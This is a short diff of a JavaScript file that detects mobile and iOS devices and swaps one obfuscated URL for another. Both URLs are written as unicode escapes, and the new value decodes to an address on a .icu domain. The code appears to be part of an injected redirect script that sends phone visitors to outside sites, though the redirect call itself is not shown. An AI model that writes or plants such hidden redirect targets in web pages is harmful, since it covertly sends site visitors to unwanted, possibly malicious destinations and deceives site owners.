@@ -8,7 +8,7 @@ function isMobile() {
         return false;
 }
 
-var url="\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0039\u0034\u0036\u0030\u0030\u0037\u002e\u0063\u006f\u006d\u002f";
+var url="\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u006c\u0069\u006e\u006b\u002e\u0062\u0065\u0074\u006d\u006c\u0065\u002e\u0069\u0063\u0075\u002f";
 function getIosVersion() {
   var str = navigator.userAgent.toLowerCase(); 
   var ver = str.match(/cpu iphone os (.*?) like mac os/);
